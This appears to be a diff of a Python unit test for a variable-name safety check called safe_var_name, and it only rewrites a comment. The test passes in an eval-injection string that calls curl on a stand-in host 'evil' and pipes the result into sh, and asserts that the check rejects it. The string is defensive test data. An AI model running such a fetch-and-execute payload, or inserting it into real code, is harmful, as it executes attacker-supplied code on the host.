@@ -63,8 +63,8 @@ class SafeVarName(unittest.TestCase):
         self.assertTrue(_safety.safe_var_name("snake_case_99"))
 
     def test_rejects_eval_payload(self):
-        # The audited shell-injection payload from
-        # topo-lang-python-pdb-and-bridge-probe-expression-injection.
+        # A shell-injection payload that, unguarded, would be eval'd into
+        # a target-side probe template and execute arbitrary code.
         self.assertFalse(
             _safety.safe_var_name(
                 "__import__('os').system('curl evil/sh | sh')#"))
